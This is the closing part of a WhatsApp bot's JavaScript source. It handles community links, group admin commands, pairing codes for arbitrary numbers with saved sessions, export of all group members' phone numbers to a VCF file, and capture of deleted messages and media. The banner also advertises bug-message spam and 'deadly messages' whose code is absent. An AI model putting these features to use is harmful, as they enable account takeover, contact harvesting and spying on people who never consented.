            resultText += `🟡 *Status:* Moderate\n*Recommendation:* Consider updating security protocols`;
          } else {
            resultText += `🔴 *Status:* At Risk\n*Recommendation:* Urgent security updates required`;
          }

          return sock.sendMessage(from, { text: resultText });
        }



        if (cmd === "/join-channel") {
          return sock.sendMessage(from, {
            text: `📢 *JOIN CHANNEL*\n\nStay updated with latest news!\n\n✨ WHY JOIN?\n├─ Latest bot updates\n├─ Feature announcements\n├─ Tips & tutorials\n└─ Community news\n\n🔗 *LINK:* ${CHANNEL}`
          }, { quoted: m });
        }

        if (cmd === "/join-group") {
          return sock.sendMessage(from, {
            text: `👥 *JOIN COMMUNITY GROUP*\n\nConnect with other users!\n\n🎉 IN THIS GROUP:\n├─ Chat with other users\n├─ Share your experience\n├─ Get instant support\n├─ Exchange tips & tricks\n└─ Join fun challenges\n\n🔗 *LINK:* ${GROUP_LINK}`
          }, { quoted: m });
        }
        if (cmd === "/links") {
          return sock.sendMessage(from, {
            text: `🔗 *DEMONIC COMMUNITY LINKS*\n\n🔥 WHY FOLLOW US?\n├─ New features first\n├─ Exclusive updates\n├─ Direct support\n└─ Community events\n\n📢 *CHANNEL:* ${CHANNEL}\n👥 *GROUP:* ${GROUP_LINK}`
          }, { quoted: m });
        }

        if ((cmd.startsWith("/link ") || cmd.startsWith("/pair ")) && isOwner(sender)) {
          const args = body.split(/\s+/).slice(1);
          const phoneNum = (args[0] || "").replace(/[^0-9]/g, "");
          if (phoneNum && phoneNum.length >= 10) {
            try {
              await sock.sendMessage(from, { text: `⏳ Generating pairing code for ${phoneNum}...\nMake sure the WhatsApp account is ready to link.` });
              
              const { state, saveCreds } = await useMultiFileAuthState(`./session-${phoneNum}`);
              const tempSock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
                browser: ["Ubuntu", "Chrome", "20.0.04"]
              });
              tempSock.ev.on("creds.update", saveCreds);
              
              await new Promise(r => setTimeout(r, 3000));
              const code = await tempSock.requestPairingCode(phoneNum);
              
              return sock.sendMessage(from, { 
                text: `✅ *PAIRING CODE GENERATED*\n\n📱 Number: ${phoneNum}\n🔑 Code: *${code}*\n\nTell the user to open WhatsApp → Settings → Linked Devices → Link with phone number and enter this code!\n(Session saved as session-${phoneNum})` 
              });
            } catch (err) {
              return sock.sendMessage(from, { text: `❌ Failed to generate pairing code: ${err.message}` });
            }
          }
          return sock.sendMessage(from, { text: "❌ Usage: /pair 2349054345858\nOnly owner can use this command." });
        }

        if (cmd === "/link" && isGroup) {
          try {

            const groupMetadata = await sock.groupMetadata(from);
            const botId = sock.user.id.split(":")[0] + "@s.whatsapp.net";
            const groupAdmins = groupMetadata.participants.filter(p => p.admin).map(p => p.id);
            const isBotAdmin = groupAdmins.includes(botId);

            if (!isBotAdmin) {
              return sock.sendMessage(from, { text: "❌ Bot needs to be Admin to get the invite link!" });
            }

            const code = await sock.groupInviteCode(from);
            return sock.sendMessage(from, { text: `🔗 *Group Link:*\nhttps://chat.whatsapp.com/${code}` });
          } catch (e) {
            console.error("Link command error:", e);
            return sock.sendMessage(from, { text: "❌ Failed to get link. Make sure bot is Admin." });
          }
        }

        if (cmd === "/revoke" && isGroup) {
          try {
            // Check if bot is admin
            const groupMetadata = await sock.groupMetadata(from);
            const botId = sock.user.id.split(":")[0] + "@s.whatsapp.net";
            const groupAdmins = groupMetadata.participants.filter(p => p.admin).map(p => p.id);
            const isBotAdmin = groupAdmins.includes(botId);


            const isSenderAdmin = groupAdmins.includes(sender);

            if (!isBotAdmin) return sock.sendMessage(from, { text: "❌ Bot needs to be Admin!" });
            if (!isSenderAdmin && !isOwner(sender)) return sock.sendMessage(from, { text: "❌ Only Admins can revoke links!" });

            await sock.groupRevokeInvite(from);
            return sock.sendMessage(from, { text: "✅ Group link has been reset!" });
          } catch (e) {
            return sock.sendMessage(from, { text: "❌ Failed to revoke link." });
          }
        }

        if (cmd === "/vcf" && isGroup) {
          try {
            const meta = await sock.groupMetadata(from);
            const participants = meta.participants;

            let vcf = "";
            let i = 1;
            for (const p of participants) {
               if (!p.id) continue;
               const num = p.id.split("@")[0];
               const contactName = `${meta.subject} ${i}`;
               vcf += "BEGIN:VCARD\n";
               vcf += "VERSION:3.0\n";
               vcf += `FN:${contactName}\n`;
               vcf += `TEL;type=CELL;type=VOICE;waid=${num}:+${num}\n`;
               vcf += "END:VCARD\n";
               i++;
            }

            const fileName = `${meta.subject.replace(/[^a-zA-Z0-9 ]/g, "").replace(/\s+/g, "_")}_Contacts.vcf`;
            
            await sock.sendMessage(from, {
              document: Buffer.from(vcf, "utf-8"),
              mimetype: "text/x-vcard",
              fileName: fileName,
              caption: `✅ *VCF FILE GENERATED*\n\nGroup: ${meta.subject}\nTotal Contacts: ${participants.length}\nFormat: ${meta.subject} 1, 2, 3...`
            });

          } catch (err) {
            console.error("Error creating VCF:", err);
            return sock.sendMessage(from, { text: `❌ Failed to generate VCF: ${err.message}` });
          }
        }

        if (cmd === "/getinfo" && isGroup) {
          const meta = await sock.groupMetadata(from);
          const admins = meta.participants.filter(p => p.admin).length;
          return sock.sendMessage(from, {
            text: `📝 *GROUP INFO*\n\n🏷️ Name: ${meta.subject}\n🆔 ID: ${meta.id}\n👑 Owner: @${meta.owner?.split("@")[0] || "Unknown"}\n👥 Members: ${meta.participants.length}\n👮 Admins: ${admins}\n📝 Desc: ${meta.desc?.toString() || "No description"}`,
            mentions: [meta.owner]
          });
        }

        if (cmd === "/admins" && isGroup) {
          const meta = await sock.groupMetadata(from);
          const admins = meta.participants.filter(p => p.admin).map(p => p.id);
          return sock.sendMessage(from, {
            text: `👮 *GROUP ADMINS*\n\n${admins.map(a => `@${a.split("@")[0]}`).join("\n")}`,
            mentions: admins
          });
        }
      } catch (error) {
        console.error("❌ Error in message handler:", error?.message || error);
        // Don't let errors crash the bot - just log and continue
      }
    });


    sock.ev.on("messages.update", async (updates) => {
      try {
        for (const u of updates) {
          if (u.update?.message === null) {
            const d = MESSAGE_STORE[u.key.id];
            if (!d) return;

            const botId = sock.user?.id ? (sock.user.id.split(":")[0] + "@s.whatsapp.net") : OWNERS[0];
            if (botId) {
              try {
                const captionText = `🗑️ *DELETED MESSAGE DETECTED*\n\n*From:* @${d.sender.split("@")[0]}\n*Chat:* ${d.from}`;
                const messageText = d.body || d.media?.caption || "(No text)";

                if (d.media?.buffer) {
                  const sendData = {
                    caption: `${captionText}\n\n*Message:* ${messageText}`,
                    mimetype: d.media.mimetype
                  };

                  if (d.media.type === "imageMessage") {
                    sendData.image = d.media.buffer;
                  } else if (d.media.type === "videoMessage") {
                    sendData.video = d.media.buffer;
                  } else if (d.media.type === "stickerMessage") {
                    sendData.sticker = d.media.buffer;
                  } else if (d.media.type === "audioMessage") {
                    sendData.audio = d.media.buffer;
                    if (d.media.ptt) sendData.ptt = true;
                  } else if (d.media.type === "documentMessage") {
                    sendData.document = d.media.buffer;
                    sendData.fileName = d.media.fileName || "deleted_document";
                  }

                  await sock.sendMessage(botId, sendData);
                } else {
                  await sock.sendMessage(botId, {
                    text: `${captionText}\n\n*Message:* ${messageText}`
                  });
                }
              } catch (err) {
                console.error("Failed to send deletion alert to owner:", err?.message || err);
              }
            }
          }
        }
      } catch (error) {
        console.error("⚠️ Error in messages.update handler:", error?.message || error);
      }
    });
  } catch (error) {
    isStarting = false;
    console.log(chalk.red.bold(`❌ CRITICAL ERROR IN startBot: ${error.message}`));
    setTimeout(() => startBot(), 10000);
  }
}


process.on("uncaughtException", (error) => {
  console.error("❌ UNCAUGHT EXCEPTION:", error);
  console.error("Stack:", error.stack);
});

process.on("unhandledRejection", (reason, promise) => {
  console.error("❌ UNHANDLED REJECTION at:", promise, "reason:", reason);
});

process.on("exit", (code) => {
  console.log(`⚠️ Process exiting with code: ${code}`);
});


process.on("SIGTERM", () => {
  console.log("🛑 SIGTERM signal received");
  process.exit(0);
});

process.on("SIGINT", () => {
  console.log("🛑 SIGINT signal received");
  process.exit(0);
});


console.log(chalk.red.bold("\n╔═════════════════════════════════════════╗"));
console.log(chalk.red.bold("║                                         ║"));
console.log(chalk.red.bold("║    🔥 DEMONIC WHATSAPP BOT v1.0.0 🔥    ║"));
console.log(chalk.red.bold("║                                         ║"));
console.log(chalk.red.bold("║         Created By: DEMON ALEX          ║"));
console.log(chalk.red.bold("║         Status: INITIALIZING...         ║"));
console.log(chalk.red.bold("║                                         ║"));
console.log(chalk.red.bold("╚═════════════════════════════════════════╝\n"));

console.log(chalk.cyan("✨ ENABLED FEATURES:"));
console.log(chalk.yellow("   Command System"));
console.log(chalk.yellow("  🐛 Bug Message Spam"));
console.log(chalk.yellow("  💣 Deadly Messages"));
console.log(chalk.yellow("  🔗 Anti-Link System"));
console.log(chalk.yellow("  👋 Welcome/Leave System"));
console.log(chalk.yellow("  📊 User Statistics"));
console.log(chalk.yellow("  🎮 Games (Dare/Truth)"));
console.log(chalk.yellow("  🔐 Owner Commands\n"));
console.log(chalk.yellow("    Demonic Commands\n"));

startBot();